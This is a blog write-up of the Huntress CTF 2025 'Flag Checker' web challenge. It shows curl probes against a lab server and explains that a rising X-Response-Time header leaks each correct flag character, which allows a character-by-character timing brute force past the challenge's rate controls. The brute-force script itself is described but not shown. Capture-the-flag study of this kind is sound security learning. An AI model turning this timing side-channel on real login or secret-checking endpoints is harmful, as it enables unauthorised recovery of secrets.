@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Huntress CTF 2025 - Flag Checker</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Huntress CTF 2025 - Flag Checker | Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Huntress CTF 2025 - Flag Checker" />
+<meta name="author" content="alphaz3r0" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge Description" />
+<meta property="og:description" content="Challenge Description" />
+<link rel="canonical" href="http://localhost:4000/writeup/web/Flag-Checker" />
+<meta property="og:url" content="http://localhost:4000/writeup/web/Flag-Checker" />
+<meta property="og:site_name" content="Writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-01T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Huntress CTF 2025 - Flag Checker" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"alphaz3r0","url":"0x41414141-code.github.io"},"dateModified":"2025-11-01T00:00:00+01:00","datePublished":"2025-11-01T00:00:00+01:00","description":"Challenge Description","headline":"Huntress CTF 2025 - Flag Checker","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeup/web/Flag-Checker"},"url":"http://localhost:4000/writeup/web/Flag-Checker"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    <h1>alphaz3r0@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <button><a href="/"><h2 class="header-link">Home</h2></a></button>
+<button><a href="/CTFs"><h2 class="header-link">CTFs</h2></a></button>
+<button><a href="/about"><h2 class="header-link">About Me</h2></a></button>
+<button><a href="/archive"><h2 class="header-link">Archive</h2></a></button>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Huntress CTF 2025 - Flag Checker</h2>
+  <time datetime="2025-11-01T00:00:00+01:00" class="by-line">01 Nov 2025</time>
+  <h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>We’ve decided to make this challenge really straight forward. All you have to do is find out the flag!</p>
+
+  <p>Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks…</p>
+</blockquote>
+
+<hr />
+<h2 id="thought-process">Thought process</h2>
+
+<p>After sending request and looking and responses and also knowing the flag format:</p>
+
+<p>I tested multiple scenarios and noticed one thing:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>f
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, 10 Oct 2025 14:53:10 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 2451
+Connection: keep-alive
+X-Response-Time: 0.101613
+
+curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>a
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, 10 Oct 2025 14:53:13 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 2451
+Connection: keep-alive
+X-Response-Time: 0.001067
+
+curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>b
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, 10 Oct 2025 14:54:06 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 2451
+Connection: keep-alive
+X-Response-Time: 0.001057
+
+</code></pre></div></div>
+
+<p>Notice anything that stands out. Lets try with this one, remember we know flag format is <code class="language-plaintext highlighter-rouge">flag\{[0-9a-f]{32}\}</code>
+So basically 32 characters of hex numbers between the {}</p>
+
+<p>Now look at these two requests:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>flag
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, 10 Oct 2025 14:56:39 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 2451
+Connection: keep-alive
+X-Response-Time: 0.401796
+
+curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span><span class="nb">test
+</span>HTTP/1.1 200 OK
+Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, 10 Oct 2025 14:56:46 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 2451
+Connection: keep-alive
+X-Response-Time: 0.000985
+</code></pre></div></div>
+
+<p>We can see that when a character is correct, the <code class="language-plaintext highlighter-rouge">X-Response-Time</code> has noticeably longer response time then the others(~0.1s). With this knowledge we can “bruteforce” the flag. So I wrote really bad script that tested all 0-9a-f and then when it found the character that has <code class="language-plaintext highlighter-rouge">X-Response-Time</code> greater then the others saves it and continues with the next character.</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   
+
+  
+</body>
+
+</html>
